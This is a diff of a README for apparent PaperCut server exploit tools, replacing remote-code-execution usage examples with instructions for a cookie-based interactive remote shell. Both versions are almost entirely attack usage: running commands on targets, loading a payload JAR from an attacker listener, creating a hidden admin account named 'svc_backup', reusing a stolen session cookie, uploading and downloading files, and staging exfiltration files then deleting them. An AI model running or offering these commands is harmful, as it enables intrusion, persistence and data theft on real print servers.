@@ -1,36 +1,25 @@
-# pcut2026
+To grab the cookie: log in via browser → DevTools → Application/Storage → Cookies → copy the JSESSIONID value.
 
-### Windows command target
-python3 papercut_external_lookup_rce.py 10.0.0.5 \
-  --win-command 'whoami > C:\proof.txt'
+One-shot command (non-interactive)
 
-### Java payload JAR (served over HTTP, loaded by the target)
-python3 papercut_external_lookup_rce.py 192.168.1.10 \
-  --jar payload.jar --lhost 192.168.1.100 --lport 8080
+python3 papercut_shell.py -u https://papercut:9191 --cookie XXXX -c "whoami"
+Interactive shell
 
-### Read-only version check only
-python3 papercut_external_lookup_rce.py 192.168.1.10 --check -v
+python3 papercut_shell.py -u https://papercut:9191 --cookie XXXX
+Once connected you get a C:\...>  prompt. Commands run via cmd.exe /c in the remote working directory.
 
-### HTTPS target with a self-signed cert (verification disabled by default)
-python3 papercut_external_lookup_rce.py papercut.corp.local --ssl \
-  --win-command 'whoami > C:\proof.txt'
-
-# Create the internal user
-python3 papercut_external_lookup_rce.py 10.0.0.5 \
-  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-new-internal-user svc_backup S3cretPass"'
-
-# Grant admin rights
-python3 papercut_external_lookup_rce.py 10.0.0.5 \
-  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-admin-access-user svc_backup"'
+Built-in commands (prefix-matched)
+Command	Purpose
+whoami, hostname, ipconfig /all, tasklist …	Any normal command → output printed to your terminal
+cd <dir> / cd	Change / show remote working directory
+dirlist	Recursively list [app]\server\web, append results to list.txt
+dirlist "C:\path"	Recursively list an arbitrary path, append to list.txt
+upload <local> <remote>	Push a file to the target (chunked)
+download <remote> <local>	Pull a file from the target (chunked)
+help	Show built-ins
+exit	Restore settings, delete exfil files, quit
+Reading list.txt
+After dirlist, fetch it from your browser or another authenticated request:
 
 
-# Easiest path: log into the admin UI in a browser, grab JSESSIONID, reuse it
-python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID
-
-# Or let the tool start the listener and run one command
-python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
-    -c "whoami"
-
-# Interactive, with an explicit callback IP/port (must be reachable FROM the target)
-python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
-    --callback http://10.0.40.83:8081
+https://<papercut>:9191/custom/list.txt
